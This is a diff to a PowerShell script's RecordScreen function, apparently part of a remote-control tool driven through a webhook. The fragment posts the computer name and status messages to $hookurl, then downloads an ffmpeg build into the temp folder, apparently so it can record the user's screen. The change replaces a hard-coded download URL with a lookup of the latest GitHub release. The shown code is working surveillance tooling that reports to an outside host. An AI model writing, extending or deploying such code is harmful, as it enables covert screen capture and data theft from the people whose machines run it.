@@ -22,10 +22,14 @@ Function RecordScreen{
     If (!(Test-Path $Path)){  
     $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":hourglass: ``Downloading ffmpeg.exe. Please wait...`` :hourglass:"} | ConvertTo-Json
     Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
-        $zipUrl = 'https://www.gyan.dev/ffmpeg/builds/packages/ffmpeg-6.1.1-essentials_build.zip'
         $tempDir = "$env:temp"
-        $zipFilePath = Join-Path $tempDir 'ffmpeg-6.1.1-essentials_build.zip'
-        $extractedDir = Join-Path $tempDir 'ffmpeg-6.1.1-essentials_build'
+        $apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
+        $response = Invoke-WebRequest -Uri $apiUrl -Headers @{ "User-Agent" = "PowerShell" } -UseBasicParsing
+        $release = $response.Content | ConvertFrom-Json
+        $asset = $release.assets | Where-Object { $_.name -like "*essentials_build.zip" }
+        $zipUrl = $asset.browser_download_url
+        $zipFilePath = Join-Path $tempDir $asset.name
+        $extractedDir = Join-Path $tempDir ($asset.name -replace '.zip$', '')
         Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
         Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
         Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
